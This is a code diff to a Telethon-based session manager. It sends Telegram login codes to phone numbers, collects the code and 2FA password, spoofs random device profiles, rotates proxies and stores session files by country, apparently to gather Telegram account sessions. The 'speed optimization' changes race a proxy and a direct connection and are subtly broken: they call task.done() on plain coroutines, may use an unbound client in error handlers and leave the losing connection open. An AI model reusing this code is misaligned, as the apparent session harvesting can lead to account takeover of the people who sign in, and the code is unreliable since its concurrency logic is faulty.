@@ -83,6 +83,7 @@ class SessionManager:
 
     async def start_verification(self, user_id, phone_number):
         try:
+            # 🚀 SPEED OPTIMIZATION: Streamlined verification process
             # Check user state limits before starting
             if not self.check_user_state_limit():
                 print(f"❌ Cannot start verification for {phone_number} - user state limit exceeded")
@@ -96,19 +97,18 @@ class SessionManager:
             with NamedTemporaryFile(prefix='tmp_', suffix='.session', dir=country_dir, delete=False) as tmp:
                 temp_path = tmp.name
             
-            # Get working proxy with health check
-            working_proxy = await proxy_manager.get_working_proxy()
-            
-            # Pick a random device
+            # Pick a random device (faster device selection)
             device = get_random_device()
             
-            # Try with proxy first if available and healthy
-            proxy_success = False
-            if working_proxy:
+            # 🚀 SPEED OPTIMIZATION: Parallel proxy and direct connection attempts
+            async def try_proxy_connection():
+                working_proxy = await proxy_manager.get_working_proxy()
+                if not working_proxy:
+                    return None, None
+                
                 try:
-                    print(f"🌐 Using proxy {working_proxy['addr']}:{working_proxy['port']} for OTP to {phone_number}")
+                    print(f"🌐 Trying proxy {working_proxy['addr']}:{working_proxy['port']}")
                     
-                    # Convert to Telethon proxy format
                     proxy_config = (
                         working_proxy['proxy_type'],
                         working_proxy['addr'],
@@ -119,40 +119,68 @@ class SessionManager:
                     )
                     
                     client = TelegramClient(
-                        temp_path, API_ID, API_HASH,
+                        temp_path + "_proxy", API_ID, API_HASH,
                         proxy=proxy_config,
                         device_model=device["device_model"],
                         system_version=device["system_version"],
-                        app_version=device["app_version"]
+                        app_version=device["app_version"],
+                        timeout=5  # Faster timeout
                     )
                     
-                    await client.connect()
-                    sent = await client.send_code_request(phone_number)
-                    proxy_success = True
-                    print(f"✅ Proxy connection successful for {phone_number}")
+                    await asyncio.wait_for(client.connect(), timeout=5)
+                    sent = await asyncio.wait_for(client.send_code_request(phone_number), timeout=5)
+                    return client, sent
                     
-                except Exception as proxy_error:
-                    print(f"❌ Proxy failed for {working_proxy['addr']}:{working_proxy['port']}: {proxy_error}")
+                except Exception as e:
+                    print(f"❌ Proxy failed: {e}")
                     proxy_manager.mark_proxy_failed(working_proxy)
-                    
-                    # Close the failed client
                     try:
                         await client.disconnect()
                     except:
                         pass
+                    return None, None
             
-            # If proxy failed or not available, try direct connection
-            if not proxy_success:
-                print(f"📡 Using direct connection for OTP to {phone_number}")
-                client = TelegramClient(
-                    temp_path, API_ID, API_HASH,
-                    device_model=device["device_model"],
-                    system_version=device["system_version"],
-                    app_version=device["app_version"]
-                )
-                
-                await client.connect()
-                sent = await client.send_code_request(phone_number)
+            async def try_direct_connection():
+                try:
+                    print(f"📡 Trying direct connection")
+                    client = TelegramClient(
+                        temp_path, API_ID, API_HASH,
+                        device_model=device["device_model"],
+                        system_version=device["system_version"],
+                        app_version=device["app_version"],
+                        timeout=5  # Faster timeout
+                    )
+                    
+                    await asyncio.wait_for(client.connect(), timeout=5)
+                    sent = await asyncio.wait_for(client.send_code_request(phone_number), timeout=5)
+                    return client, sent
+                except Exception as e:
+                    print(f"❌ Direct connection failed: {e}")
+                    try:
+                        await client.disconnect()
+                    except:
+                        pass
+                    return None, None
+            
+            # 🚀 SPEED OPTIMIZATION: Race between proxy and direct connection
+            tasks = [try_proxy_connection(), try_direct_connection()]
+            
+            # Wait for the first successful connection
+            for completed_task in asyncio.as_completed(tasks, timeout=10):
+                try:
+                    client, sent = await completed_task
+                    if client and sent:
+                        print(f"✅ OTP sent successfully to {phone_number}")
+                        # Cancel remaining tasks
+                        for task in tasks:
+                            if not task.done():
+                                task.cancel()
+                        break
+                except Exception as e:
+                    continue
+            else:
+                # All attempts failed
+                return "error", "Could not establish connection to send OTP"
 
             import time
             self.user_states[user_id] = {
@@ -178,10 +206,16 @@ class SessionManager:
 
         client = state["client"]
         try:
-            await client.sign_in(phone=state["phone"], code=code, phone_code_hash=state["phone_code_hash"])
+            # 🚀 SPEED OPTIMIZATION: Faster code verification with timeout
+            await asyncio.wait_for(
+                client.sign_in(phone=state["phone"], code=code, phone_code_hash=state["phone_code_hash"]),
+                timeout=10
+            )
         except SessionPasswordNeededError:
             state["state"] = "awaiting_password"
             return "password_needed", None
+        except asyncio.TimeoutError:
+            return "error", "Verification timeout. Please try again."
         except Exception as e:
             if os.path.exists(state["session_path"]):
                 os.unlink(state["session_path"])
@@ -207,7 +241,10 @@ class SessionManager:
         client = state["client"]
 
         try:
-            await client.sign_in(password=password)
+            # 🚀 SPEED OPTIMIZATION: Faster 2FA verification with timeout
+            await asyncio.wait_for(client.sign_in(password=password), timeout=10)
+        except asyncio.TimeoutError:
+            return "error", "2FA verification timeout. Please try again."
         except Exception:
             return "error", "Current 2FA password is incorrect."
 
